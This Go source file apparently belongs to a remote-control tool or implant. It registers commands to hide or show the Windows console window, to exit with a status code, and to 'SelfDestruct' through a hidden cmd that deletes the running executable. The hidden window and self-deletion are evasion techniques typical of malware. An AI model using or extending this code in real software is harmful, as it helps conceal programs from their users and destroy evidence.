package Commands

import (
	"os"
	"os/exec"
	"strconv"
	"syscall"
)

const SW_HIDE = 0
const SW_SHOWNORMAL = 1

var (
	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	procGetConsoleWindow = kernel32.NewProc("GetConsoleWindow")
	user32               = syscall.NewLazyDLL("user32.dll")
	procShowWindow       = user32.NewProc("ShowWindow")
)

func hideConsoleWindow() {
	hwnd, _, _ := procGetConsoleWindow.Call()
	if hwnd != 0 {
		_, _, _ = procShowWindow.Call(hwnd, SW_HIDE)
	}
}

func showConsoleWindow() {
	hwnd, _, _ := procGetConsoleWindow.Call()
	if hwnd != 0 {
		_, _, _ = procShowWindow.Call(hwnd, SW_SHOWNORMAL)
	}
}

func selfDestruct(args []string) {
	defer os.Exit(0)
	path, _ := os.Executable()

	cmd := exec.Command("cmd", "/C", "ping", "-n", "2", "localhost", "&&", "del", path)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // Hide the command window
	cmd.Start()
}

func terminateWithStatus(args []string) {
	if len(args) == 0 {
		os.Exit(0)
	} else {
		code, err := strconv.Atoi(args[0])
		if err != nil {
			os.Exit(0)
		} else {
			os.Exit(code)
		}
	}
}

func ConsoleVisibility(args []string) {
	if args[0] == "hide" {
		hideConsoleWindow()
	}
	if args[0] == "show" {
		showConsoleWindow()
	}
}

func init() {
	RegisterCommand("Window", "Hiding/Showing Window", ConsoleVisibility)
	RegisterCommand("SelfDestruct", "Self Destruct", selfDestruct)
	RegisterCommand("Terminate", "Terminate with status code", terminateWithStatus)
}
